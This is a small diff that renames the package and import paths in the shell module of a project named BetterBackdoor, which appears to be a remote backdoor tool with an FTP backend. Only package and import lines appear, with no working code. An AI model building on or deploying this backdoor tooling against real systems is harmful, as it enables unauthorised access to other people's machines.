@@ -1,11 +1,11 @@
-package com.thatcherdev.betterbackdoor.shell;
+package dev.thatcherclough.betterbackdoor.shell;
 
 import java.io.File;
 import java.io.IOException;
 
-import com.thatcherdev.betterbackdoor.BetterBackdoor;
-import com.thatcherdev.betterbackdoor.backend.FTP;
-import com.thatcherdev.betterbackdoor.backend.Utils;
+import dev.thatcherclough.betterbackdoor.BetterBackdoor;
+import dev.thatcherclough.betterbackdoor.backend.FTP;
+import dev.thatcherclough.betterbackdoor.backend.Utils;
 
 import org.apache.commons.io.FileUtils;
 
